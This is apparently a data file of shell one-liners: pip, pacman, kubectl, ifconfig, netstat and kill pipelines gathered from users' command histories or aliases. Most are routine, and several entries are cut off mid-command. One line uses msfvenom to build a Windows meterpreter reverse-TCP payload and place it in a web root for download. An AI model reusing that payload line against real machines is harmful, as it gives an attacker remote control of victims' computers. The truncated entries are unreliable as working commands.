"pip list | tail -n +3 | cut -d"" "" -f1 | xargs pip show -f"
"pip list | grep wanderu | cut -d "" "" -f 1 | xargs pip uninstall -y"
"pip list -ol --format=freeze --user | grep -v ""^\-e"" | cut -d= -f1 | xargs -n1 pip install -U --user"
"pip list --user | cut -d"" "" -f 1 | tail -n +3 | xargs pip install -U --user"
"pip list --outdated | grep Current | cut -d "" "" -f 1 | xargs sudo pip install -U"
"pip list --outdated | grep -v ""^\-e"" | cut -d "" "" -f 1 | xargs -n1 pip install --upgrade"
"pip list --outdated | cut -d' ' -f1 | sed -e '1,2d' | xargs pip install --upgrade"
"pip list --outdated -v | grep ""home"" | cut -d "" "" -f 1 | xargs pip install -U --user"
"pip list --outdated --format=freeze | grep -vE ""(^\-e|conda)"" | cut -d "
"pip list --outdated --format=freeze | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 sudo pip install -U"
"pip list --outdated --format=freeze | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U"
"pip list --outdated --format=freeze | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U --user"
"pip freeze | grep -v ""^\-e"" | cut -d = -f 1 | sudo xargs -n1 pip install -U"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 |xargs -n1 sudo -H pip install -U"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs pip install -U"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs pip install -U pip"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs pip install --upgrade"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 sudo -H pip install -U"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install --upgrade --user"
"pip freeze --local | grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 -P10 pip uninstall -y"
"pip freeze --local | \grep -v ""^\-e"" | cut -d = -f 1 | xargs -n1 pip install -U"
"ping `hostname`|head -1|cut -d ""("" -f2|cut -d "")"" -f1"
"ping -c 20 -s 2 192.168.2.255 | grep ""10 bytes from"" | awk ""{print $4}"" | cut -d"":"" -f1"
"ping -c 1 $(ifconfig | grep broadcast | awk ""{print \$NF}"") && arp -a | column -t"
"phpstorm $(git diff --name-status $(git rev-parse --abbrev-ref HEAD) $(git merge-base $(git rev-parse --abbrev-ref HEAD) master) | grep ""^[MD]"" | while read line; do echo $(pwd)""/""${line:2}; done | tr ""\n"" "" "")"
"phpfiles | xargs grep ""^class "" | awk ""{print \$2}"" | sort"
"phpcbf --standard=ruleset.xml \`phpcs --standard=ruleset.xml -s --cache | sed 's/FILE: \(\/[^.]*.php\)/\1/;t;d' | sed 's,\x1B\[[0-9;]*[a-zA-Z],,g' | sed 'N;s/\n/ /'\`"
"pgrep -u ""$USER"" mosh-server | tr "" "" ""\n"" | grep -v ""$PPID"" | xargs kill"
"pf | tr ""="" "" "" | grep ""^[^-]""| column -t"
"perl -spi -e""s|\r\$||"""
"perl -spi -e""s|\$|\r|"""
"perl -pe 's/^[^+-@](.*)$/$PR_DIM\1$PR_NO/gm|s/^\-(.*)$/$PR_RED\1$PR_NO/gm|s/^\+(.*)$/$PR_BLUE\1$PR_NO/gm|s/^@@ \-(\d+),\d+ \+(\d+),\d+ @@/Lines $PR_RED\1$PR_NO and $PR_BLUE\2$PR_NO\./gm'"
"perl -i -p -e ""s|[\r\n]+|\r\n|g"" $1"
"perl -e ""for($i=0;;$i++){print pack(""n"", ((($i*($i>>8|$i>>9)&46&$i>>8))^($i&$i>>13|$i>>6)));}"" | play -c 2 -b 8 -e unsigned -t raw -r 48k -"
"perl -Mlocale -pe ""s|\B\w+\B|join q(),sort{rand 2}$&=~/./g|ge"""
"pbpaste | xargs node -e ""console.log(encodeURIComponent(process.argv[1]))"" | xargs -I {} curl ""https://www.1stdibs.com/soa/query-builder/1/search?uriRef={}"" | jq "
"pbpaste | perl -pi -e ""s/^\""|\""$//g"" $1 | jsonpp $1"
"pbpaste | jq ""."" | pbcopy; echo ""json formated and pasted to clipboard: ""; pbpaste | jq ""."""
"paste <(ls -A | xargs -l1 -d""\n"" du -sh | cut -f 1) <(ls -AF) | sort -h"
"pacman -Slq | fzf -m --preview 'cat <(pacman -Si {1}) <(pacman -Fl {1} | awk \""{print \$2}\"")' | xargs -r sudo pacman -S"""
"pacman -Qqe | grep -vx ""$(pacman -Qqg base)"" | grep -vx ""$(pacman -Qqm)"" | grep -vx ""$(<$HOME/bin/backup_exclude_pkgs)"" > $HOME/github/pdq/main.lst && echo $(tr -s ""\n"" "" "" < $HOME/github/pdq/main.lst)"
"pacman -Qqe | grep -v ""$(pacman -Qqm)"" | gist -u https://gist.github.com/be21c377c3e212b434723f3a23d71295 -pf pacman.packages; pacman -Qqm | gist -u https://gist.github.com/011d2c7c9fe5e8b5bb904d27c0f4d18b -pf aur.packages"
"pacman -Qqe | grep -v ""$(pacman -Qqm)"" | gist -pf pacman.packages; pacman -Qqm | gist -pf aur.packages"
"pacman -Ql | sed ""s/^\(\w\+\).*/\1/g"" | uniq | less"
"pacman -Qi|awk '/^Installed Size/{print int(\$4), name} /^Name/{name=\$3}'|sort -nr|less"
"pacman -Qii | grep ""^MODIFIED"" | sed ""s/MODIFIED\s\+//"" | sort"
"pacman -Qi | awk '/^Name/{name=\$3} /^Installed Size/{print \$4\$5, name}' | sort -hr | sed '20q'"
"pacman -Qdtq | sudo pacman -Rnsc --noconfirm - 2> /dev/null || echo ""Nothing to delete"""
"pacat --record -d ""$(pacmd list | grep -P ""^\s*name:.*\.monitor"" | head -n1 | sed ""s/\s*name\: <\(.*\)>/\1/g"")"" --file-format=wav ~/Media/ARecordings/$(date +""%F_%H-%M-%S"").wav"
"p4 changes -s pending -u jmickey | awk ""{print $2}"" | xargs p4 describe -s | grep pending"
"p4 changes -m1 @`p4 client -o | grep ^Client: | cut -f2 -d"" "" | tr -d ""\r\n""`"
"open `git remote show origin | grep ""Fetch"" | perl -p -i -e ""s/:/\//g""| perl -p -i -e""s/Fetch URL\/ git@/http:\/\//g""`"
"open `git remote -vv | cut -f2 | cut -d "" "" -f1 | sed ""s/.git/\/pull-requests/g""`"
"open `git remote -v | grep fetch | awk ""{print $2}"" | sed "
"open ""https://github.com/$(git remote -v | head -n 1 | cut -d : -f 2 | cut -d . -f 1)"""
"olo ""ERROR|WARN|Exception|Error"""
"old_clients=$(tmux list-clients -F ""#{client_activity},#{client_tty}"" | sort | tail -n+2 | cut -d, -f2); if [ -n $old_clients ]; then for old_client in $old_clients; do tmux detach-client -t $old_client; done; else echo ""No other tmux clients.""; fi"
"oc get pods -o jsonpath=""{..image}"" |tr -s ""[[:space:]]"" ""\n"" |sort |uniq -c"
"npm test && git branch | grep ""* "" | awk ""{print \$2}"" | xargs git push --set-upstream origin "
"npm run | grep ""^\s\s\w"" | fzf | xargs npm run"
"npm ls | grep -o ""\S\+@\S\+$"" | tr @ "" "" | awk -v q="
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(tail $HISTFILE -n1 | sed "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|tail
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|ta
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(history|
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(echo $history[$HISTCMD]|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(echo $history[$HISTCMD] |sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(echo $history[$HISTCMD] | sed -re "
"notify-send --urgency=low -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$(echo $history[$HISTCMD] | sed -e "
"notify-send --urgency=low -i ""$( (( $? == 0 )) && echo terminal || echo error)"" ""$(fc -nl -1|sed -e "
"notify-send ""$([ $? = 0 ] || echo error)"" ""$(echo $history[$HISTCMD] |sed -e "
"nocorrect noglob echo \\033[1m""`ps auxw | head -1`"" \\033[0m; ps auxw | grep -v grep | grep -i "
"nmap -sn 192.168.0.0/24 | egrep ""Host is up|Nmap scan report for|latency"" --color"
"nmap -sP $(nm-tool | grep "" Address"" | cut -d "" "" -f14-34 | cut -d ""."" -f1-3).0/24"
"nix-store --gc --print-roots | egrep -v ""^(/nix/var|/run/\w+-system|\{memory)"""
"ngrep -qt -W byline -d eth0 -v ""^OPTIONS|CSeq: 102 OPTIONS|^SUBSCRIBE|CSeq: [0-9]* SUBSCRIBE"" port 5060"
"next=$( printf ""%02d\n"" ""$(( $( ls image_[0-9]*.img 2>/dev/null | grep -o [0-9]* | sort -n | tail -n1 ) + 1 ))"" ) ; qemu-img create -f qcow2 -o preallocation=metadata image_${next}.img ; unset next"
"networksetup -getsocksfirewallproxy ""Wi-Fi"" | grep ""Enabled"" | head -n1 | cut -d "" "" -f 2"
"networksetup -getairportpower en1 | grep ""On"" && networksetup -setairportpower en1 off || networksetup -setairportpower en1 on "
"networksetup -getairportpower en0 | grep ""On\$"" >/dev/null && networksetup -setairportpower en0 off || networksetup -setairportpower en0 on"
"netstat -rn|egrep ""^(0.0.0.0|default)""|awk ""{print \$2}"""
"netstat -f inet | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail +2"
"netstat -alnp tcp | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail +2"
"netstat -alnp --protocol=tcp4 | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail +2"
"netstat -alnp --protocol=inet|grep -v CLOSE_WAIT|cut -c-6,21-94|tail"
"netstat -alnp --protocol=inet | grep -v ESPERANDO_FECHAR | cut -c-6,21-94 | tail "
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-99 | tail -n +2"
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail -n +2"
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail -10"
"netstat -alnp --protocol=inet | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail +2"
"netstat -a | grep -v localhost | grep EST | sort -k4,4"
"nethogs $(ifconfig |grep flag|grep -v lo |cut -f1 -d"":"")"
"nethogs $(ifconfig | grep -B1 ""inet""|grep -i ether|cut -f1 -d"" "")"
"netctl list | grep ""*"";iwconfig 2>/dev/null|grep Signal|sed ""s/^\s*//"";[ $? -ne 0 ]&&echo No Signal"
"mysq | egrep ""jyang21|raghu|xie186"""
"my_file=$(find /usr/include -type f | sort -R | head -n 1); my_len=$(wc -l $my_file | awk ""{print $1}""); let ""r = $RANDOM % $my_len"" 2>/dev/null; vim +$r $my_file"
"mvn clean install 2>&1 | tee mvn-log.txt && notify-send ""passed"" || notify-send ""failure logged"""
"msfvenom -p windows/meterpreter/reverse_tcp LHOST=`ifconfig -a | grep ""Bcast"" | cut -d "":"" -f2 | cut -d "" "" -f 1` LPORT=443 -f exe > msf.exe && mv msf.exe /var/www && echo ""msf.exe created and moved in /var/www/"""
"mplayer `\ls -lv /proc/$(pgrep -nf plugin)/fd/* | grep Fl | awk ""{print \\$9;}"" | tail -n 1`"
"mplayer `\ls -lv /proc/$(pgrep -nf plugin)/fd/* | grep Fl | awk ""{print \\$9;}"" | tail -n 1` -dumpstream -dumpfile"
"mpc playlist | grep -i ""$1"" | awk { print $1 } | cut -d""\)"" -f1"
"mount|& grep /dev/sd|cut -f 1 -d"" ""|sort"
"mount | grep ""${HOME}/google-drive"" >/dev/null || /usr/bin/google-drive-ocamlfuse ""${HOME}/google-drive"""
"mount /dev/""`dmesg | grep -o ""\\[[a-z1-9]*\\]"" | tail -n 1 | tr -d []`""1 /mnt/disk && chown root:disk /mnt/disk && chmod 0770 /mnt/disk"
"mount -t msdos /dev/sd""`(mount | grep -q /dev/sd2) && echo 3 || echo 2`""i /mnt"
"mount -l | grep -P ""\/dev|\[|\]"""
"more /proc/cpuinfo |grep ""physical id""|grep ""0""|wc -l "
"mkvirtualenv --python=/usr/bin/python3.7 -a `pwd` `pwd | rev | cut -f 1 -d ""/"" | rev`"
"mkdir -p ~/Downloads/Flash && sudo tree -f /proc/1/fd /proc/1000536/fd /proc/1001394/fd /proc/106/fd /proc/948228/fd | grep -i flash | cut -d "" "" -f 2 | xargs -I{} sudo cp ""{}"" ~/Downloads/Flash && sudo chown ""$USER:$USER"" ~/Downloads/Flash/* 2>/dev/null && for x in ~/Downloads/Flash/*; do mv -f ""${x%.*}"" ""$x.flv"" 2>/dev/null; done"
"memo grep list | fzf | cut -d : -f 1,2 | xargs code -g"
"man ascii | grep Tables -A15 | cut -c 25- | sed 's/^ / /;s/$^//;1,2d;5d'"
"man -k . | fzf --prompt=""Man> "" --tiebreak=begin,length,index | awk ""{print $1}"" | xargs -r man"
"man $(man -k . | sort | fzf -e | awk ""{print \$1}"")"
"make 2>&1 | egrep ""error:.*|undefined reference .*|Error .*"""
"make 2>&1 >/dev/null | tac | egrep --color ""\b(error)\b|$"""
"make -qp|awk -F':' '/^[a-zA-Z0-9][^\$#\/\t=]*:([^=]|\$)/ {split(\$1,A,/ /);for(i in A)print A[i]}'|sort"
"make -qp | awk -F':' '/^[a-zA-Z0-9][^\$#\/\t=]*:([^=]|\$)/ {split(\$1,A,/ /);for(i in A)print A[i]}' | sort"
"make -qp | awk -F':' '/^[a-zA-Z0-9][^$#\/\t=]*:([^=]|$)/ {split(\$1,A,/ /);for(i in A)print A[i]}' | sort -u"
"ls|sort -g|sed -r ""s/(.*)/\""\1\""/g""|xargs mpv"
"lspci | grep -i ""vga\|3d\|2d"""
"lspci -nn -s \$(lspci | grep -m1 VGA | cut -f1 -d"" "") | cut -d: -f3-"
"lspci -k | grep -EA3 ""VGA|3D|Display"""
"lsof -i -P | grep LISTEN | grep ""TCP.*:"" | sort"
"lsof -i -P -a | grep -i ""listen"" | _cut_lsof | sort"
"lsof -P -i :8080 | grep LISTEN | awk ""{print $2}"" | xargs kill "
"lsof -P -i :8000 | grep LISTEN | awk ""{print $2}"" | xargs kill "
"lsof -P -i :5000 | grep LISTEN | awk ""{print $2}"" | xargs kill "
"lsof -P -i :3000 | grep LISTEN | awk ""{print $2}"" | xargs kill "
"lsof -P -i -n | cut -f 1 -d "" ""| uniq | tail -n +2"
"lsof -F n -p `pidof Preview` | grep /Users/`whoami` | grep -v ""/Users/`whoami`/Library"" | cut -c 2-"
"lsload -R ""order[]"" | fgrep -v login | fgrep -v unavail | sort -n -k 6"
"lscpu | grep ""CPU(s):"" | grep -v NUMA | cut -d "" "" -f15"
"lsblk -o HOTPLUG,NAME,SIZE,MODEL,TYPE | awk ""NR == 1 || /disk/"""
"lsb_release --id --release --codename | grep ""Release"" | cut -d "":"" -f 2 | sed -e ""s/^[ \t]*//"""
"lsb_release --id --release --codename | grep ""Distributor ID"" | cut -d "":"" -f 2 | sed -e ""s/^[ \t]*//"""
"lsb_release --id --release --codename | grep ""Codename"" | cut -d "":"" -f 2 | sed -e ""s/^[ \t]*//"""
"ls /usr/share/nmap/scripts | grep -i $1| cut -d"" "" -f 11 | paste -s -d,"
"ls /Applications | grep "".app"" | peco | xargs -I{} open -a ""/Applications/{}"""
"ls -prt | grep / | tail -n +3 | sed ""s/\///"""
"ls -lcth | egrep ""^d"" | grep -v "" 225_"" | head -n20"
"ls -lah|grep ""\->"" 2>/dev/null || echo ""no symlinked files here..."""
"ls -lah | grep ""\->"" 2> /dev/null || echo ""no symlinked files here..."""
"ls -lah | awk ""{print \$9, \"" \"" \$5}""| column -t | sort"
"ls -la | grep ""^d"" && ls -la | grep ""^-"" && ls -la | grep ""^l"""
"ls -la -h --color | grep ""^d"" && ls -la -h | grep ""^-"" && ls -la -h | grep ""^l"""
"ls -la --color | grep ""^d"" && ls -la | grep ""^-"" && ls -la | grep ""^l"""
"ls -lA | egrep ""^-|^d"" | wc -l"
"ls -l /var/log/*.out | cut -d\K -f2 | cut -d\/ -f1,4 | /usr/local/bin/growlnotify -s -t ""Últimas rondas de mantenimiento"""
"ls -d */ | xargs -I _ sh -c ""find \""_\"" -type f | wc -l | xargs echo _"""
"ls -ap| grep / | tail -n +3 | sed ""s/\///"""
"ls -alp | grep ""^d"" && ls -alp | grep ""^-"" && ls -alp | grep ""^l"""
"ls -aGhl | grep ""^d"" && ls -aGhl | grep ""^-"" && ls -aGhl | grep ""^l"""
"ls -a1 | grep ""^\."" | grep ""swp$"" | xargs rm"
"ls -a | rg -v ""^\.+$"" | xargs -I {} du -sh {} | sort -h"
"ls -a | grep -v ""^\.\.$"" | grep -v ""^\.$"" | xargs du -sch"
"ls -a | grep -E ""(\#.*\#|.*~)"" | xargs -n 1 -x rm"
"ls -R | grep ""^[.]/"" | sed -e ""s/:$//"" -e ""s/[^\/]*\//--/g"" -e ""s/^/ |/"""
"ls -R | grep "":$"" |sed -e ""s/:$//"" -e ""s/[^-][^\/]*\//--/g"" -e ""s/^/ /"" -e ""s/-/|/"""
"ls -R | grep "":$"" | sed -e ""s/:$//"" -e ""s/[^-][^\/]*\//–/g"" -e ""s/^/ /"" -e ""s/-/|/"""
"ls -R | grep "":$"" | sed -e ""s/:$//"" -e ""s/[^-][^\/]*\//--/g"" -e ""s/^/ /"" -e ""s/-/|/"""
"ls -R | grep "":$"" | grep -v "".svn"" | sed -e "
"ls -CFalht --color=force | grep -e ""^d"" -e total --color=never;ls -CFalht --color=force | grep -vE ""^d|total"""
"ls -CFalhS --color=force | grep -e ""^d"" -e total --color=never;ls -CFalhS --color=force | grep -vE ""^d|total"""
"ls -Ap | grep ""/"" && echo ""Total:"" && ls -Ap | grep ""/"" | wc -l"
"ls -Alh --color | head; ls -Al | wc -l | xargs -I{} printf ""\nShowing max 10 out of {} entries\n"""
"ls -AFl | grep ""^d""; ls -AFl | grep ""^-""; ls -AFl | grep ""^l"""
"ls -A | xargs -I{} du -sm ""{}"" 2>/dev/null | awk ""{if(9 < \$1) print}"" | distribution"
"ls -A | while read line; do echo ""stat $line""; done | bash | sed -n -e ""s/^.*File: /File: /p"" -e ""s/^.*Links: /Links: /p"""
"ls -1Rhs | sed -e \""s/^ *//\"" | grep \""^[0-9]\"" | sort -h"
"ls -1Rhs | sed -e ""s/^ *//"" | grep ""^[0-9]"" | sort -h"
"ls -1 `figlet -I2` | grep ""\.flf$"" | cut -f 1 -d ""."" | sort -u"
"ls -1 /home/jose/.ssh/ | grep "".pub"" | sed ""s/.pub//"" | while read i; do ssh-add /home/jose/.ssh/$i; done"
"ls err.txt succ.txt | cut -d""_"" -f4 | sort| uniq"
"lpass show -c --password $(lpass ls | fzf | awk ""{print $NF}"" | sed ""s/\]//g"")"
"lpass show -c --password $(lpass ls | fzf | awk ""{print $(NF)}"" | sed ""s/\]//g"")"
"lpass show -c --password ""$(lpass ls | fzf | awk ""{print \$(NF)}"" | sed ""s/\]//g"")"""
"logicals | grep ""arc\|music"" ; alias | grep bru"
"logf | egrep -i ""^\[|^test"" | egrep -v ""Server: csperform"""
"llc --version | grep Default | tr -s "" "" | cut -d "" "" -f4"
"ll. | grep ""^l"" | awk ""{print \$1,\$9,\$10,\$11}"" | column -t"
"ll. | grep ""^d"" | awk ""{print \$1,\$9,\$10,\$11}"" | column -t"
"ll. | grep ""^-"" | awk ""{print \$1,\$9}"" | column -t"
"ll | grep -e ""^d"" | grep -v "" \."" | cut -c50-"
"ll | grep ""^l"" | awk ""{print \$1,\$9,\$10,\$11}"" | column -t"
"ll | grep ""^d"" | awk ""{print \$1,\$9,\$10,\$11}"" | column -t"
"ll | grep ""^-"" | awk ""{print \$1,\$9}"" | column -t"
"ll /etc/cnames/stations | grep ""^l"" | awk ""{print \$8 \"" (node \"" substr(\$10,10) \"")\""}"" | sort"
"ll /etc/cnames/rooms | grep ""^l"" | awk ""{print \$8 \"" (node \"" substr(\$10,10) \"")\""}"" | sort"
"list-all-targets | while read target; do echo ""Building $target...""; make $target 2>&1 || echo $target 1>&2; done"
"less /var/log/exim_mainlog | grep sendmail | grep -vE ""csf|FCron"""
"lasttag | ruby -e 'puts STDIN.read.sub(/(\d\d)$/) { |m| sprintf(%q{%02d}, \$1.to_i + 1) } '"
"kubectl get svc -l app=nginx-ingress,component=controller -n kube-system -o json | jq -r '.items | .[].status.loadBalancer.ingress | .[].ip'"
"kubectl get pods -o jsonpath=""{..containers..image}"" | tr -s ""[[:space:]]"" ""\n"" | sort | uniq"
"kubectl get pods -n kube-system | grep bigip | cut -f 1 -d "" "" | xargs -L 1 kubectl delete pod -n kube-system"
"kubectl get pods --all-namespaces -o jsonpath=""{..image}"" | tr -s ""[[:space:]]"" ""\n"" | sort | uniq -c"
"kubectl get po | grep -v ""flink\|exec\|driver"""
"kubectl get po -owide --all-namespaces | grep ""0/"" | tee /dev/tty | wc -l"
"kubectl get event | grep -v Normal | grep -v ""[2-5].m"" | grep "" [a-z]\{3,\}-"""
"kubectl get crd --no-headers | awk ""{print $1}"" | grep -v amazonaws | xargs kubectl delete crd"
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true pods | grep ${PWD##*/} | fzf | tr -d ""\n""` bundle exec rails c"
"kubectl exec -ti `kubectl get -o=custom-columns=NAME:.metadata.name --no-headers=true pods | fzf | tr -d ""\n"" | tee >(pbcopy)` bash"
"kubectl config view | grep id-token | cut -f 2 -d "":"" | tr -d "" """
"kubectl config view -o json | jq -r "".contexts | map(select(.name == \""$(kubectl config current-context)\"")) | .[0].context.namespace"""
"kubectl config get-contexts -o name | sed ""s/^/ /;\|^ $(kubectl config current-context)$|s/ /*/"""
"kubectl config get-contexts -o name | sed ""s/^/ /;\|^ $(krc)$|s/ /*/"""
"kubectl -n com-att-ocnp-mgmt exec -it $POD -- gluster volume info | egrep -i ""volume name:|brick"" | grep -v Bricks"
"kpn() { kubectl get pod | grep $1 | head -n1 | cut -d "" "" -f1; };kpn"
"kp | grep avito-site | cut -d"" "" -f1 | xargs kubectl delete pod"
"kitploit.py |grep -v href |grep -v ""/a"" |grep -v ""]"""
"kill -9 `ps ax | grep node | grep meteor | awk """
"kill -9 `ps aux | grep rails | tail -n 1 | awk ""{print $2}""`"
"kill -9 $(ps ww |grep ScreenSaverEngine |grep -v grep |awk ""{print $1}"")"
"kill -9 $(ps ax | grep clion | ag jvm | cut -d "" "" -f 2)"
"kill -9 $(ps ax | grep ""standalone/log/server.log"" | grep java | awk "
"kill -9 $(ps aux|grep plugin|grep chrome|cut -d \ -f5,6)"
"kill -9 $(ps -ux | fzf | tr -s "" "" | cut -d "" "" -f 2)"
"kill -9 $(ps -ef|grep tomcat|grep -v grep|awk ""{print \$2}""); tc-start; tc-log"
"kill -9 $(ps -ef|grep tomcat|grep -v grep|awk ""{print \$2}"")"
"kill $(ps u -C ssh|grep ousted|tr -s "" ""|cut -d "" "" -f 2)"
"kill $(ps ax|grep evilwm|grep -v grep|cut -d "" "" -f 2 )"
"kill $(ps axu | grep ssh\ ops | grep -v grep | cut -d"" "" -f 3-4)"
"kill $(ps au|grep ""python server.py""|sed -n ""1P""|cut -c 9-15); deactivate"
"kill $(ps aux | grep ""node dist"" | grep -v ""grep"" | awk "
"kill $(ps aux | grep ""bin/nginx"" | grep -v grep | awk ""{ print \$2}"")"
"kill $(ps aux | grep ""[V]LC"" | grep -v ""[V]LC -Idummy"" | awk "
"kill $(ps -efl | grep 'drx' | awk '{print $4}' | head -1)"""
"kcu stt && kex `kg po | grep celery-worker | head -n1 | cut -d"" "" -f1` pipenv run python manage.py shell"
"kcu stp && kex `kg po | grep celery-worker | head -n1 | cut -d"" "" -f1` pipenv run python manage.py shell"
"k config get-contexts -o name | sed ""s/^/ /;\|^ $(krc)$|s/ /*/"""
"jps | grep Bootstrap >/dev/null && kill -9 $(jps | grep Bootstrap | cut -f 1 -d"" "")"
"journalctl -n 400 -fu griffin.* |tee grffnLog$(date +%d%b_%H%M).txt | sed ""s/ultimakersystem-ccbdd3000... python3.4//"" |grep -iv http"
"joe $(joe list | gsed ""s/,\s/\n/g"" | peco | gsed ""N; s/\n/ /g"")"
"jnettop -x ""not udp"" -i $(ifconfig |grep flag|grep -v lo |cut -f1 -d"":"")"
"jnettop -x ""not udp"" -i $(ifconfig |grep -B1 ""inet""|grep -i ether|cut -f1 -d"" "")"
"j=1;for i in *.(jpg|png|bmp|jpeg); do mv ""$i"" ""$j"".""${i##*.}""; let j=j+1;done"
"iwconfig wlan0 | grep ESSID | $(which grep) -o ""\"".*\"""" | tr -d \"""
"is.repo && for branch in `git branch -r | grep -v HEAD`;do echo -e `git show --format=""%an ---> %ai %ar"" $branch | head -n 1` \\t$branch; done | sort -r"
"irssi --config=<(sed ""$(grep ""PASSWORD_MANAGER"" $XDG_CONFIG_HOME/irssi/config|cut -d\"" -f2|cut -d"":"" -f2|xargs -IXXX sh -c "
"ipcrm -q $(ipcs -q | grep 666 | tr -s "" "" | cut -d "" "" -f 2)"
"ipconfig | grep -a IPv4 | tr "" "" ""\n"" | tail -n1"
"ip; ifconfig -a | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"ip route | grep docker | sed -e ""s/.* src //"" | tr -d "" """
"ip r l | grep ""172.*/32 dev en7"" | grep -v "".1/32"" | cut -f1 -d ""/"""
"ip a|grep inet|sort|perl -n -e ""/([0-9a-f:.]+)\/[0-9]+/ && print \""\$1\n\"""""
"ip address show wlan0 | grep ""inet "" | cut -d "" "" -f 6 | cut -d ""/"" -f 1"
"ip addr | grep wlp |grep -oE ""\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"" | head -1"
"ip addr | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"ip addr | grep -A 3 wlp3s0 | grep inet | cut -d"" "" -f6"
"ip addr show |grep -E ""inet""|grep -E ""eth0|ens33"""
"ip addr show | grep -o 'inet6\? \(addr:\)\?\s\?\(\(\([0-9]\+\.\)\{3\}[0-9]\+\)\|[a-fA-F0-9:]\+\)' | awk '{ sub(/inet6? (addr:)? ?/, \"
"ip addr list|grep -P ""(.*inet (?!127).*)|(.*inet6 ((?!fe80)[^:]).*)""| awk ""{print \$2}"""
"ip a | grep -e enp -e enx | awk ""/inet /{print $2}"" | cut -d/ -f1"
"ip -o addr show | fgrep ""scope global"" | sed -r ""s/[ \t]+/ /g"" | cut -d"" "" -f2,3,4"
"ip -o addr show scope global | grep inet | cut -d"" "" -f 2,7 | cut -d/ -f1"
"ip -o -4 addr | cut -d "" "" -f 7 | rg ""192.168"" | cut -d ""/"" -f 1"
"ip -o -4 addr list $(ls /sys/class/net | grep enp) | awk ""{print $4}"" | cut -d/ -f1"
"ip -f inet address | grep inet | grep -v 'lo$' | cut -d ' ' -f 6,13 && curl ifconfig.me && echo ' external ip'"
"inventory.prod | xargs -I{} -P8 ssh {} ""docker ps| awk '{ \""hostname\"" | getline con; print con\""/\""\$1; }'"""
"inventory.preprod | xargs -I{} -P8 ssh {} ""docker ps| awk '{ \""hostname\"" | getline con; print con\""/\""\$1; }'"""
"insult | tr -d ""\n"" | tr ""[a-z]"" ""[A-Z]"" | pbcopy"
"inotifywait -mr -e ClOSE_WRITE,DELETE --exclude ""(.*\.sw[:alpha:]?|.*~|[0-9]+|.*/\.git/.*)"""
"ifconfig|grep -A 4 ""en0""|grep -oe ""[[:digit:]]\{2,3\}.[[:digit:]]\{2,3\}.[[:digit:]]\{2,3\}.[[:digit:]]\{2,3\}[[:space:]]""|pbcopy;echo ""copied IP to clipboard: "";pbpaste"
"ifconfig |grep ""inet "" | grep -v 127.0.0.1 | awk "
"ifconfig | grep inet\ | tail -1 | cut -d "" "" -f 2"
"ifconfig | grep inet | grep broadcast | cut -d "" "" -f 2"
"ifconfig | grep 192 | cut -d"" "" -f2 | pbcopy"
"ifconfig | grep -o ""inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*"" | sed ""s/inet //"" | sed ""/127.*/d"""
"ifconfig | grep -Po ""inet.+broadcast"" | grep -Po ""(?:\d{1,3}\.){3}\d{1,3}"" | head -n 1 > $DROPBOX_PATH/Documents/workhorseIP.txt && cat $DROPBOX_PATH/Documents/workhorseIP.txt"
"ifconfig | grep -Eo ""inet (addr:)?([0-9]*\.){3}[0-9]*"" | grep -Eo ""([0-9]*\.){3}[0-9]*"" | grep -v ""127.0.0.1"""
"ifconfig | grep -Eo ""inet (addr:)?([0-9]*\.){3}[0-9]*"" | grep -Eo ""([0-9]*\.){3}[0-9]*"" | grep -v ""127.0.0.1"" && ipcountry"""
"ifconfig | grep -Eo ""inet (addr:)?([0-9]*\.){3}[0-9]*"" | grep -Eo ""([0-9]*\.){3}[0-9]*"" | grep -v ""127."""
"ifconfig | grep -E ""Bcast"" | cut -d "":"" -f2 | cut -d "" "" -f1"
"ifconfig | grep -A 4 en0 | grep ""inet "" | cut -d "" "" -f 2"
"ifconfig | grep ""inet addr"" | head -n 1 | cut -f1 -d"
"ifconfig | grep ""inet "" | tail -1 | cut -d "" "" -f2"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d\ -f2"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d"" "" -f2"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d"
"ifconfig | grep ""inet "" | grep -v 127.0.0.1 | cut -d : -f2"
